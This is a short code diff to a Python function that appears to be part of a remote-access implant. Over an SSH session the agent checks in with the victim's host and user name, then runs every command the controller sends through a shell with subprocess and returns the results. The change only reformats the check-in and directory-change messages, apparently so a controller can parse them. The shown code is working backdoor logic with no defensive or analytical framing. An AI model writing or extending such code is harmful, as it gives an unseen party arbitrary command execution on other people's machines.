@@ -38,7 +38,7 @@ def SSH_comm():
         sys.exit()
 
     if start_session.active:
-        start_session.send(f"[*] Agent checked in from \"{host}\" as \"{user}\".\n")
+        start_session.send(f"{host},{user}")
         print(start_session.recv(1024).decode())
         while True:
             incoming = start_session.recv(1024)
@@ -50,7 +50,7 @@ def SSH_comm():
                     path = " ".join(command.split(" ")[1:])
                     os.chdir(path)
                     CWD = os.getcwd()
-                    start_session.send(f"[*] Changed directory to {CWD}\n")
+                    start_session.send(f"True,{CWD}")
                 else:
                     command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                     if (len(command_out) == 0):
